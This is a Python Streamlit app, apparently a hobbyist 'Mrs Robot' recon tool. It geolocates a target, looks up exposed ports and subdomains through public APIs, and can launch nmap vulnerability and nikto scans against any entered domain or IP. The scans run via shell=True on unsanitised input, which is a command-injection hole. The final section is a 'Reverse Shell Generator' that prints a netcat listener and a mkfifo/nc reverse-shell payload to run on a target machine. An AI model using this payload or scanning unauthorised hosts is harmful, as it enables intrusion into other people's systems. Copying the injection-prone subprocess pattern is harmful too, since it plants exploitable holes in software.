import streamlit as st
import socket
import requests
import pandas as pd
import subprocess

st.set_page_config(page_title="Mrs Robot - Predator Recon", layout="wide")

st.markdown("""
    <style>
    .stApp {
        background-color: #000000;
        color: #00FF00;
        font-family: 'Courier New', Courier, monospace;
    }
    .stTextInput>div>div>input {
        background-color: #111111;
        color: #00FF00 !important;
        border: 2px solid #00FF00 !important;
        font-family: 'Courier New', Courier, monospace;
    }
    .stCheckbox>label>div>p {
        color: #00FF00 !important;
    }
    .stButton>button {
        background-color: #00FF00 !important;
        color: #000000 !important;
        font-weight: bold;
        border: 2px solid #00FF00 !important;
        box-shadow: 0 0 10px #00FF00;
    }
    .stButton>button:hover {
        background-color: #000000 !important;
        color: #00FF00 !important;
    }
    h1, h2, h3, p, span, label, pre {
        color: #00FF00 !important;
        font-family: 'Courier New', Courier, monospace;
    }
    div.stCodeBlock {
        border: 1px solid #00FF00 !important;
    }
    .stDataFrame {
        border: 1px solid #00FF00;
    }
    </style>
    """, unsafe_allow_html=True)

st.markdown("<h1 style='text-align: center; font-size: 60px; font-weight: bold; letter-spacing: 5px; margin-bottom: 0px;'>MRS ROBOT</h1>", unsafe_allow_html=True)
st.markdown("<h3 style='text-align: center; color: #00FF00; font-style: italic; margin-top: 0px; letter-spacing: 2px;'>MADE BY AHAD</h3>", unsafe_allow_html=True)
st.markdown("<p style='text-align: center; color: #00AA00;'>[ Automated OSINT & Network Attack Surface Analyzer ]</p>", unsafe_allow_html=True)
st.write("<hr style='border: 1px solid #00FF00;'>", unsafe_allow_html=True)

target_input = st.text_input("[ENTER TARGET DOMAIN OR IP ADDRESS]:", placeholder="e.g., website name, or ip address , 44.228.249.3")

st.markdown("### [ Configure Advanced Exploitation Vectors ]")
col_opt1, col_opt2 = st.columns(2)
with col_opt1:
    run_nmap_vuln = st.checkbox("Enable Nmap Deep Vulnerability Script Scan")
with col_opt2:
    run_nikto = st.checkbox("Enable Nikto Web Server Vulnerability Scanner")

st.write(" ")

if st.button("EXECUTE SYSTEM PENETRATION RECON"):
    if not target_input.strip():
        st.error("[-] Error: System requires a target validation input.")
    else:
        domain = target_input.replace("http://", "").replace("https://", "").split('/')[0].split(':')[0].strip()
        
        with st.spinner("[*] Injecting recon scripts and fetching network data..."):
            
            col1, col2 = st.columns(2)
            
            with col1:
                st.markdown("### [ Infrastructure Logs ]")
                try:
                    target_ip = socket.gethostbyname(domain)
                    st.write(f"**[+] Target IP Resolved:** `{target_ip}`")
                    
                    ip_info = requests.get(f"http://ip-api.com/json/{target_ip}").json()
                    if ip_info['status'] == 'success':
                        st.write(f"**[+] Geolocation:** {ip_info.get('city')}, {ip_info.get('country')}")
                        st.write(f"**[+] ISP / Provider:** {ip_info.get('isp')}")
                    else:
                        st.write("[-] Geolocation metrics restricted.")
                except:
                    st.write("[-] Host Resolution Failed.")
                    target_ip = None

            with col2:
                st.markdown("### [ Shodan Service Logs ]")
                if target_ip:
                    try:
                        idb_res = requests.get(f"https://internetdb.shodan.io/{target_ip}").json()
                        if 'ports' in idb_res and idb_res['ports']:
                            st.write(f"**[!] Exposed Ports:** {idb_res['ports']}")
                            if 'cpes' in idb_res and idb_res['cpes']:
                                st.write("**[⚠️] Software Risks Mapped:**")
                                for cpe in idb_res['cpes'][:4]:
                                    st.write(f" - `{cpe}`")
                        else:
                            st.write("[+] Safe: No critical exposed ports found in active intelligence logs.")
                    except:
                        st.write("[-] Threat Intelligence Engine is unreachable.")
                else:
                    st.write("[*] Waiting for valid IP sequence...")

            st.write("<hr style='border: 0.5px solid #00FF00;'>", unsafe_allow_html=True)
            
            st.markdown("### [ Subdomain Attack Surface Map ]")
            try:
                sub_res = requests.get(f"https://api.hackertarget.com/hostsearch/?q={domain}").text
                if "error" not in sub_res and sub_res.strip():
                    sub_lines = sub_res.strip().split('\n')
                    sub_data = [line.split(',') for line in sub_lines]
                    
                    df_subs = pd.DataFrame(sub_data, columns=["Subdomain", "IP Address"])
                    st.write(f"[+] Active Endpoints Harvested: **{len(df_subs)}**")
                    st.dataframe(df_subs, use_container_width=True)
                else:
                    st.write("[-] No corporate subdomains crawled in public repositories.")
            except:
                st.write("[-] Database lookup timeout.")

            if run_nmap_vuln and target_ip:
                st.write("<hr style='border: 0.5px solid #00FF00;'>", unsafe_allow_html=True)
                st.markdown("### [ Active Nmap Vulnerability Engine Output ]")
                with st.spinner("[*] Scanning core service layers with Nmap..."):
                    cmd_nmap = f"nmap -F --script vuln {target_ip}"
                    nmap_res = subprocess.run(cmd_nmap, shell=True, capture_output=True, text=True)
                    st.text_area("Nmap Log Box:", value=nmap_res.stdout, height=250)

            if run_nikto:
                st.write("<hr style='border: 0.5px solid #00FF00;'>", unsafe_allow_html=True)
                st.markdown("### [ Active Nikto Web Scanner Engine Output ]")
                with st.spinner("[*] Injecting web server exploit vectors via Nikto..."):
                    cmd_nikto = f"nikto -h {domain} -Tuning 123489"
                    nikto_res = subprocess.run(cmd_nikto, shell=True, capture_output=True, text=True)
                    st.text_area("Nikto Log Box:", value=nikto_res.stdout, height=250)
                
            st.write("<hr style='border: 1px solid #00FF00;'>", unsafe_allow_html=True)
            st.success("[+] Mission Accomplished. All intelligence vector segments saved successfully.")

st.markdown("## [ Netcat Control Room & Reverse Shell Generator ]")
st.write("Configure local listener port to catch connection:")

col_nc1, col_nc2 = st.columns(2)
with col_nc1:
    lport = st.text_input("Configure Local Listening Port (LPORT):", value="4444")
with col_nc2:
    st.write("**1. Run this command in your main Kali Terminal to active listener:**")
    st.code(f"nc -lvnp {lport}", language="bash")

st.write("**2. Execute payload on target machine:**")
st.code(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_KALI_IP {lport} >/tmp/f", language="bash")
